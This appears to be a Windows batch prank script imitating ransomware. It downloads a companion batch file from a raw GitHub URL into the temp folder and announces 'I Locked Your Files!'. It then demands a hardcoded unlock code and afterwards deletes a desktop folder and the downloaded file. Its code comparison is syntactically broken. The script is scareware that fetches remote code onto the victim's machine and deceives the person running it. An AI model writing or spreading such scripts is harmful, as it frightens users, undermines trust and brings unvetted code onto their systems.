@echo off

:check
if exist "%tmp%\le.bat" (goto s) else (goto cale)

:cale
cd %tmp%
curl https://raw.githubusercontent.com/AvianJay/maybe/main/le.bat --output le.bat > nul

:s
echo I Locked Your Files!
echo Enter code to unlock!
goto askcode

:askcode
set /p code=Enter Code:
if %code%=thisiscode (goto unlock) else (echo Incorrect Code! & goto askcode)

:unlock
echo Please Close "878787" window and press any key.
pause > nul
cd %USERPROFILE%\Desktop
rmdir 9487hahayoufilesocks
del %tmp%/le.bat
echo unlocked.press any key to exit.
pause > nul
exit